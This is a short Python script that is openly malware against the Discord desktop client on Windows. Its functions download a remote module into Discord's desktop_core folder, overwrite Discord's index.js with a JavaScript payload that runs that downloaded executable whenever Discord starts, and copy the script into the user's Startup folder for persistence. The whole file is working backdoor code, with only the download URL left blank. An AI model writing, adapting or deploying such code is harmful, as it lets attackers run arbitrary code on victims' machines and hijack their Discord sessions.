import os
import requests
import shutil

url = ""
user = str(os.environ["USERNAME"])
basename = str(os.path.basename(__file__))

payload = """const { exec } = require("child_process");
exec("C:\\\\Users\\\\" + user + "\\\\AppData\\\\Local\\\\Discord\\\\app-1.0.9001\\\\modules\\\\discord_desktop_core-1\\\\discord_desktop_core\\\\module.exe", (error, stdout, stderr) => {
if (error) {
        console.log(`error: ${error.message}`);
        return;
}
if (stderr) {
    console.log(`stderr: ${stderr}`);
    return;
}
console.log(`stdout: ${stdout}`);
});
module.exports = require('./core.asar');
"""

def download_module():
    r = requests.get(url, allow_redirects=True)
    with open("C:\\Users\\" + user + "\\AppData\\Local\\Discord\\app-1.0.9001\\modules\\discord_desktop_core-1\\discord_desktop_core", "wb") as f:
        f.write(r.content) 

def backdoor(filename):
    with open(filename, 'r') as f2:
        content = f2.read()
        if content == payload:
            exit()
        else:
            f2.close()
    with open(filename, 'w')as f:
        f.write(payload)

def persistance():
    shutil.copy(__file__, "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    exit()

def main():
    path = "C:\\Users\\" + user + "\\AppData\\Local\\Discord\\app-1.0.9001\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js"
    download_module()
    backdoor(path)
    persistance()

main()
